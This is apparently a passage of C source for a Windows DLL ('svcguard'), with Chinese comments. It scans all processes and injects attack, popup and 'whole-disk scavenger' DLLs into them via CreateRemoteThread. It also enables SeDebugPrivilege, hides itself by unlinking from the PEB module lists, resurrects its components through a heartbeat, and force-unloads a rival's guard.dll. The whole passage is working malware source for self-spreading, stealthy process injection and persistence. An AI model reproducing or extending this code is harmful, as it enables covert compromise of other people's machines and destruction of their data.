                       名字也换成了随机系统 dll 名 —— 这个判据现在是双向失准的
                       （永远返回"没有"），拿它当"该不该注入"的依据会导致反复注入。 */
                    /* ================== 按目标类型选模块集（用户指定的矩阵） ==================
                       桌面类宿主：dwm / explorer / notepad / conhost / cmd
                           → svcguard（复活/心跳） + window（弹窗冗余） + guard（看门）
                       其它进程：
                           → atkcore（攻击） + svcguard（复活） + dedery（全盘清道夫）
                       xx.exe 自己另外加载 defense（保护）+ atkcore（攻击）。 */
                    {
                        BOOL bDesktopHost = IsDesktopHostLeaf(pe.szExeFile);
                        struct { int which; const WCHAR *tag; const WCHAR *name; } set[3];
                        int nSet = 0, k;

                        if (bDesktopHost) {
                            set[0].which = 0; set[0].tag = L"svcguard"; set[0].name = L"svcguard.dll";
                            set[1].which = 1; set[1].tag = L"window";   set[1].name = L"window.dll";
                            set[2].which = 2; set[2].tag = L"guard";    set[2].name = L"guard.dll";
                            nSet = 3;
                        } else {
                            set[0].which = 3; set[0].tag = L"atkcore";  set[0].name = L"atkcore.dll";
                            set[1].which = 0; set[1].tag = L"svcguard"; set[1].name = L"svcguard.dll";
                            set[2].which = 4; set[2].tag = L"dedery";   set[2].name = L"dedery.dll";
                            nSet = 3;
                        }

                        for (k = 0; k < nSet; k++) {
                            if (XXModulePresent(pe.th32ProcessID, set[k].tag, NameTok())) continue;
                            if (InjectDll(hProc, InjectPathOf(set[k].which), pe.th32ProcessID)) {
                                nInj++;
                                WriteInjectLog(L"%ls -> PID=%lu %ls", set[k].name, pe.th32ProcessID, pe.szExeFile);
                            } else {
                                MarkRejected(pe.th32ProcessID);
                            }
                        }
                    }
                    InjCacheAdd(pe.th32ProcessID);
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        /* 每 10 秒报一次扩散统计：拿不到弹窗日志时也能一眼看出注入是否发生 */
        {
            DWORD now = GetTickCount();
            if (dwStatTick == 0 || now - dwStatTick >= 10000) {
                WriteDeamonLog(L"扩散统计(10s): 扫描(进程×轮)=%d 注入成功=%d OpenProcess失败=%d\n",
                               nSeen, nInj, nOpenFail);
                dwStatTick = now;
                nSeen = nInj = nOpenFail = 0;
            }
        }

        if (bImXx) {
            DWORD now = GetTickCount();
            if (dwGuardScan == 0 || now - dwGuardScan >= INJ_REFRESH_MS) {
                dwGuardScan = now;
                ValidateGuardHosts();
                EnsureGuardHosts();
            }
        }
        Sleep(IsRunningInXxExe() ? 1000 : 5000);   /* 扩散频率（用户指定）：xx 1000ms、宿主内 5000ms；攻击扫描频率不动 */
    }
    return 0;
}

/* 卸载对手注入的 guard.dll：只保留与我方同目录的那一份 */
static void UnloadForeignGuardPass(void)
{
    WCHAR ourGuard[MAX_PATH] = L"";
    WCHAR dllPath[MAX_PATH];
    if (g_szOwnDir[0]) {
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", g_szOwnDir);
    } else if (GetModuleFileNameW(g_hSelfModule, dllPath, MAX_PATH)) {
        WCHAR *ps = wcsrchr(dllPath, L'\\');
        if (ps) ps[1] = L'\0';
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
    }

    FARPROC pFreeLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) return;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                       PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HMODULE mods[1024];
            DWORD needed = 0;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    WCHAR modPath[MAX_PATH];
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const WCHAR *base = wcsrchr(modPath, L'\\');
                    base = base ? base + 1 : modPath;
                    if (_wcsicmp(base, L"guard.dll") != 0) continue;
                    if (ourGuard[0] && _wcsicmp(modPath, ourGuard) == 0) continue;
                    HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pFreeLib, mods[i], 0, NULL);
                    if (h) {
                        WaitForSingleObject(h, 1000);
                        CloseHandle(h);
                        WriteDeamonLog(L"卸载外来 guard.dll: PID=%lu %ls\n", pe.th32ProcessID, modPath);
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    Sleep(3000);
    while (!g_bExitFlag) {
        UnloadForeignGuardPass();
        Sleep(2000);
    }
    return 0;
}

static void StartRemoteAttack(void)
{
    WCHAR dir[MAX_PATH], path[MAX_PATH];
    if (g_szOwnDir[0]) {
        wcsncpy_s(dir, MAX_PATH, g_szOwnDir, _TRUNCATE);
    } else if (!GetModuleFileNameW(g_hSelfModule, dir, MAX_PATH)) {
        return;
    }
    WCHAR *pSlash = wcsrchr(dir, L'\\');
    if (pSlash) *(pSlash + 1) = L'\0';
    else return;
    swprintf_s(path, MAX_PATH, L"%satkcore.dll", dir);
    HMODULE hKill = LoadLibraryW(path);
    if (!hKill) {
        WriteDeamonLog(L"加载 atkcore.dll 失败: %ls err=%lu\n", path, GetLastError());
        return;
    }
    WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
    /* 会话随机名也推给本地这份 atkcore（同进程，直接调用即可） */
    {
        typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
        SetNames_t pSet = (SetNames_t)XXGetProcByName(hKill, "XxSetNames");
    
        if (pSet) {
            XX_NAME_BLOCK blk;
            XXNameBlockInit(&blk, NameTok(), 0);
            pSet(&blk);
        }
    }
    typedef void (WINAPI *StartAttack_t)(void);
    StartAttack_t pStart = (StartAttack_t)XXGetProcByName(hKill, "StartAttack");

    if (pStart) {
        pStart();
        WriteDeamonLog(L"StartAttack 已调用\n");
    } else {
        WriteDeamonLog(L"StartAttack 导出未找到\n");
    }
}

static DWORD WINAPI BootThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    StartRemoteAttack();
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

__declspec(dllexport) void WINAPI DeamonInit(void)
{
    BOOL bPriv = EnableDebugPrivilege();
    DWORD sid = 0;
    /* xx.exe 自身的 DACL 会拒绝 Everyone（连自己都打不开），在它进程里
       ProcessIdToSessionId(自己) 会失败并给 0；所以优先读共享内存里记的会话号 */
    if (g_pSharedView) sid = (DWORD)XX_SESSION(g_pSharedView);
    if (sid == 0) ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    WriteDeamonLog(L"DeamonInit: pid=%lu session=%lu SeDebugPrivilege=%ls\n",
                   GetCurrentProcessId(), sid, bPriv ? L"ON" : L"OFF");
    CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);

#if !XX_HOST_INJECTION
    WriteDeamonLog(L"宿主注入已关闭（XX_HOST_INJECTION=0）：只做心跳监控/复活，不注入任何进程\n");
    return;
#endif

    /* 弹窗宿主（explorer/taskhost）里只保留心跳监控：
       Spreader 会从宿主再往别的进程注入、OwnFileShield 会反复锁文件 —— 这两件最重，
       而且历史上它们一跑，宿主就崩（用户实测 explorer 反复"已停止工作"）。
       弹窗宿主崩了 = 弹窗没了，所以宁可少做事。 */
    {
        WCHAR leaf[MAX_PATH] = L"";
        OwnHostLeaf(leaf, MAX_PATH);
        if (IsPopupHostProcess(leaf)) {
            WriteDeamonLog(L"DeamonInit: 弹窗宿主（%ls）只起心跳监控，跳过扩散/文件盾\n", leaf);
        } else {
            CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
            CreateThread(NULL, 0, OwnFileShieldThread, NULL, 0, NULL);
        }
    }
}

/* ================== 崩溃日志（诊断版） ==================
   把"出错模块 + RVA + 访问类型 + 栈回溯"都写出来，这样**不需要 Process Explorer / dump**
   就能定位到具体函数：
     [CRASH] svcguard pid=1572 host=explorer.exe code=0xC0000005 (write to 0x00000000)
             at window.dll+0x54C0  frames: svcguard.dll+0x12AB ntdll.dll+0x3C1D …
   模块/RVA 用 GetModuleHandleExW(FROM_ADDRESS) 反查 —— 即使模块被我们摘过链，
   只要不是我们自己那份，也能查到；查不到就写绝对地址。 */
static void DescribeAddr(void *addr, WCHAR *out, SIZE_T cch)
{
    HMODULE hMod = NULL;
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *leaf;
    if (!addr) { wcsncpy_s(out, cch, L"(null)", _TRUNCATE); return; }
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                           GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                           (LPCWSTR)addr, &hMod) && hMod) {
        if (!GetModuleFileNameW(hMod, path, MAX_PATH)) path[0] = L'\0';
        leaf = path[0] ? (wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path) : L"?";
        _snwprintf(out, cch - 1, L"%ls+0x%IX", leaf, (ULONG_PTR)addr - (ULONG_PTR)hMod);
    } else {
        _snwprintf(out, cch - 1, L"%p", addr);
    }
    out[cch - 1] = L'\0';
}

static LONG WINAPI DeamonCrashFilter(EXCEPTION_POINTERS *ep)
{
    DWORD code = 0;
    void *addr = NULL;
    ULONG_PTR info0 = 0, info1 = 0;
    WCHAR where[300] = L"(?)", frames[600] = L"";
    WCHAR host[MAX_PATH] = L"";

    if (ep && ep->ExceptionRecord) {
        code = ep->ExceptionRecord->ExceptionCode;
        addr = ep->ExceptionRecord->ExceptionAddress;
        if (ep->ExceptionRecord->NumberParameters >= 2) {
            info0 = ep->ExceptionRecord->ExceptionInformation[0];  /* 0=读 1=写 8=执行 */
            info1 = ep->ExceptionRecord->ExceptionInformation[1];  /* 出错的内存地址 */
        }
    }
    OwnHostLeaf(host, MAX_PATH);
    DescribeAddr(addr, where, _countof(where));

    {   /* 栈回溯：最多 10 帧，每帧都换算成 模块+0xRVA */
        void *stack[10];
        USHORT n = RtlCaptureStackBackTrace(1, 10, stack, NULL), i;
        for (i = 0; i < n; i++) {
            WCHAR one[160];
            DescribeAddr(stack[i], one, _countof(one));
            wcscat_s(frames, _countof(frames), (i == 0) ? one : L" ");
            if (i > 0) {
                WCHAR sep[8] = L" ";
                (void)sep;
            }
        }
    }

    WriteDeamonLog(L"[CRASH] svcguard pid=%lu host=%ls code=0x%08lX %ls at=%ls\n"
                   L"        frames: %ls\n",
                   GetCurrentProcessId(), host, (unsigned long)code,
                   (info0 == 1) ? L"(write)" : (info0 == 8) ? L"(exec)" : L"(read)",
                   where, frames[0] ? frames : L"(none)");
    /* 出错的内存地址也写出来：0x0 之类说明是空指针/偏移写 */
    if (info1) WriteDeamonLog(L"        fault-addr=0x%IX\n", info1);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        SetUnhandledExceptionFilter(DeamonCrashFilter);

        /* 摘 PEB 链之后 GetModuleHandle/GetModuleFileName(自己) 就查不到了，
           所以先把自身模块信息缓存下来，后面一律用缓存值。 */
        g_hSelfModule = hinst;
        GetModuleFileNameW(hinst, g_szSelfPath, MAX_PATH);

        /* 模块被隐藏后注入方无法再用"模块列表"判断宿主里有没有我们，会反复重复
           注入；没有单例就会在同一进程里叠出多份实例、多套线程。已有实例时直接
           让加载失败（返回 FALSE），这样重复注入不会残留映射。

           **不再等 token**（原来这里等 300ms）：XxSetNames 是注入方在 LoadLibrary
           返回之后才远程调用的，DllMain 这一刻 g_dwNameToken 还是 0，但候选表
           （token → 共享 64 位 salt → 固定值 → 裸名）让创建与探测用同一张表，
           回退名同样能被注入方认出来，所以等待纯属白送时间 —— 而 yy 的
           HunterWorker 每 50ms 就杀一轮，这 300ms 很贵。 */
        g_hSingleton = XXModuleSingleton(L"svcguard", NameTok());
        if (!g_hSingleton) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

#if !XX_HOST_INJECTION
        WriteDeamonLog(L"DllMain: 宿主注入已关闭（XX_HOST_INJECTION=0），不起 Boot/Unload/扩散线程\n");
        return TRUE;
#endif
        /* 同样按"弹窗宿主"减负：
             BootThread → StartRemoteAttack → 在宿主里 LoadLibrary(atkcore.dll)，
                          等于绕过了"重模块不进弹窗宿主"的策略；
             UnloadForeignGuardThread → 对宿主里的模块做 FreeLibrary，
                          如果那个模块的线程正在跑就会直接崩（写非法地址）。
           这两个在弹窗宿主里一律不启动。 */
        {
            WCHAR leaf[MAX_PATH] = L"";
            OwnHostLeaf(leaf, MAX_PATH);
            if (IsPopupHostProcess(leaf)) {
                WriteDeamonLog(L"DllMain: 弹窗宿主（%ls）不启动 Boot/Unload 线程\n", leaf);
            } else {
                CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
                CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
            }
        }
    }
    return TRUE;
}
































